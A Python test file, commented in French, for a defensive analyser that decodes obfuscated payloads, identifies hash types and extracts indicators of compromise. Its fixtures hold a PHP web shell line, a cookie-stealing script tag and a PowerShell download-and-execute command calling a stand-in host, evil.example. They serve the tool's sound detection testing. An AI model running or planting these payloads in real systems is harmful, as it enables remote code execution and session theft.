#!/usr/bin/env python3
"""Tests de l'analyseur de preuves (décodage défensif). Aucun réseau.

Lancer : python3 tests/test_preuve.py
"""
from __future__ import annotations

import base64
import gzip
import os
import sys
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from tasko import preuve as P  # noqa: E402


def check(cond, nom):
    print(f"  {'OK ' if cond else 'ÉCHEC'} {nom}")
    return bool(cond)


def run() -> int:
    ok = True

    # 1) base64 d'un payload PHP obscurci -> révélé + comportement détecté
    charge = "<?php system($_GET['c']); eval(base64_decode($x)); ?>"
    b64 = base64.b64encode(charge.encode()).decode()
    a = P.analyser(b64)
    ok &= check(a["deobfuscation"]["profondeur"] >= 1, "base64 : au moins une couche décodée")
    ok &= check("system" in a["comportement_apparent"] and "eval" in a["comportement_apparent"],
                "base64 : comportement (system, eval) repéré")

    # 2) Couches imbriquées : URL-encodage DANS du base64
    inner = urllib.parse.quote("<script>document.cookie</script>")
    b64b = base64.b64encode(inner.encode()).decode()
    a2 = P.analyser(b64b)
    ok &= check(a2["deobfuscation"]["profondeur"] >= 2, "couches imbriquées : base64 puis URL décodés")
    ok &= check("<script" in a2["deobfuscation"]["final"], "contenu final révélé (<script>)")

    # 3) gzip + base64 (PowerShell -enc typique)
    ps = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a')"
    gz_b64 = base64.b64encode(gzip.compress(ps.encode())).decode()
    a3 = P.analyser(gz_b64)
    ok &= check("downloadstring" in a3["comportement_apparent"], "gzip+base64 : payload PowerShell révélé")
    ok &= check("http://evil.example/a" in a3["iocs"]["urls"], "gzip+base64 : URL extraite comme IOC")

    # 4) hex
    h = "<?php echo 'pwn'; ?>".encode().hex()
    a4 = P.analyser(h)
    ok &= check("pwn" in a4["deobfuscation"]["final"], "hex : décodé")

    # 5) String.fromCharCode
    js = "String.fromCharCode(60,115,99,114,105,112,116,62)"  # <script>
    a5 = P.analyser(js)
    ok &= check("<script" in a5["deobfuscation"]["final"], "fromCharCode : décodé en <script>")

    # 6) Hashs : identification du TYPE, jamais de cassage
    corpus = ("admin:5f4dcc3b5aa765d61d8327deb882cf99 "
              "$2b$12$abcdefghijklmnopqrstuuABCDEFGHIJKLMNOPQRSTUVWXYZ012345 "
              "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
    a6 = P.analyser(corpus)
    types = {h["type"] for h in a6["hashs"]}
    ok &= check(any("32 hex" in t for t in types), "hash : MD5/NTLM (32 hex) identifié")
    ok &= check("bcrypt" in types, "hash : bcrypt identifié")
    ok &= check(any("64 hex" in t for t in types), "hash : SHA-256 identifié")
    # Aucune API de cassage n'existe dans le module (défensif) :
    ok &= check(not any(hasattr(P, n) for n in ("casser", "crack", "bruteforce", "dechiffrer_cle")),
                "aucune fonction de cassage/brute force exposée")

    # 7) IOC bruts
    a7 = P.analyser("connexion depuis 203.0.113.9 vers http://c2.evil.example/x , mail a@b.cm")
    ok &= check("203.0.113.9" in a7["iocs"]["ips"], "IOC : IP extraite")
    ok &= check("a@b.cm" in a7["iocs"]["emails"], "IOC : email extrait")

    # 8) Texte en clair : pas de fausse couche
    a8 = P.analyser("Ceci est une phrase normale, sans encodage particulier.")
    ok &= check(a8["deobfuscation"]["profondeur"] == 0, "texte clair : aucune couche inventée")

    # 9) Markdown
    md = P.rendre_markdown(a3)
    ok &= check("décodage défensif" in md and "Aucun cassage" in md,
                "Markdown : mention explicite du périmètre défensif")

    print("\nRÉSULTAT :", "TOUS LES TESTS PASSENT" if ok else "DES TESTS ÉCHOUENT")
    return 0 if ok else 1


def test_preuve():
    assert run() == 0


if __name__ == "__main__":
    raise SystemExit(run())
